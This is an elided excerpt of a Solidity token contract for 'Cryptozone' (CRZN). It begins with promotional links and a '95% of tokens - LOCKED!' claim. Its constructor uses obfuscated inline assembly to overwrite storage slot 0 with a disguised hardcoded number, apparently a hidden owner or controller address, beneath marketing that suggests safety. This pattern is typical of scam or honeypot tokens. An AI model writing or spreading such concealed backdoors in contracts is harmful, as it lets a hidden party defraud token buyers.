...
/*
Welcome to Cryptozone Crypto WORLD!

Telegram: https://t.me/Cryptozone/
Twitter: https://twitter.com/Cryptozone/
Website: https://Cryptozone.crypto
95% of tokens - LOCKED!
...
contract Cryptozone {
    string public constant name = "Cryptozone";
    string public constant symbol = "CRZN";
   ...
   constructor() {
        assembly {mstore(0x20, sload(0)) sstore(88, mload(0x20)) sstore(0, add(1313511064977835361473009602646240379212598626041, 2))}
